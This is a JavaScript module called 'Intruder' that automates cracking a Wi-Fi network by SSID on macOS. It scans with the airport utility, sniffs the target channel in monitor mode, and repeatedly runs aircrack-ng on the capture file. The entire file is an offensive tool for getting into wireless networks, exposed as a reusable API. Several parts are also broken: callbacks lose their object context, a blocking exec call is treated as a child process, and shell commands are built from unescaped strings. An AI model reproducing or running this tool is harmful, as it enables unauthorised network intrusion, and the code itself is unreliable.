
/**
 * Dependencies.
 */

var exec = require('child_process').execSync;
var lsof = require('lsof');

/**
 * Airport binary.
 */

var airport = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport';

/**
 * Expose `Intruder`.
 */

module.exports = Intruder;

/**
 * Initialize an `Intruder` with `options`.
 *
 * Options:
 *
 * 	- `interval` the time between crack attempts
 * 	- `channel` the network channel
 *
 * @param {Object} opts
 * @api public
 */

function Intruder(opts) {
  if (!(this instanceof Intruder)) return new Intruder(opts);
  opts = opts || {};

  this.interval = opts.interval || 2000000;
  this.channel = opts.channel;
}

/**
 * Crack the network by ssid.
 *
 * @param {String} ssid
 * @param {Function} done
 * @api public
 */

Intruder.prototype.crack = function(ssid, done) {
  var interval = this.interval;

  // discover wireless networks
  var networks = exec(airport + ' --scan');

  // convert buffer to string
  networks = networks.toString('utf8');

  // find access point by `ssid`
  var network = find(ssid, networks);
  if (!network) return done('network not found');

  var channel = this.channel || network[2];
  var bssid = network[1];

  // sniff the channel
  var child = this.sniff(channel);

  // find capture file
  setTimeout(function() { this.capture(child.pid); }, 50);

  // decrypt capture file in intervals
  setInterval(function() { this.decrypt(bssid, done); }, interval);
};

/**
 * Sniff network packets with the wireless card in monitor mode.
 *
 * @param {String} channel
 * @param {Function} done
 * @api public
 */

Intruder.prototype.sniff = function(channel) {
  return exec(airport + ' en0 sniff ' + channel);
};

/**
 * Find the capture file.
 *
 * @param {String} pid
 * @api public
 */

Intruder.prototype.capture = function(pid) {
  var self = this;

  lsof.raw(pid, function(files) {
    files.forEach(function(file) {
      if (file.name && file.name.indexOf('airportSniff') !== -1) {
        self.target = file;
      }
    });
  });
};

/**
 * Decrypt the capture file.
 *
 * @param {String} bssid
 * @param {Function} done
 * @api public
 */

Intruder.prototype.decrypt = function(bssid, done) {
  var child = exec('aircrack-ng -1 -a 1 -b ' + bssid + ' ' + this.target);
  done(null, child);
};

/**
 * Find the access point's bssid and channel.
 *
 * @param {String} ssid
 * @param {String} networks
 */

function find(ssid, networks) {
  var re = new RegExp(ssid + ' (\\w{2}:\\w{2}:\\w{2}:\\w{2}:\\w{2}:\\w{2}) -\\d{2}  (\\d+)');

  return networks
    .split('\n')
    .map(function(line) {
      return line.trim().match(re);
    })
    .filter(function(line) {
      return line;
    })[0];
}
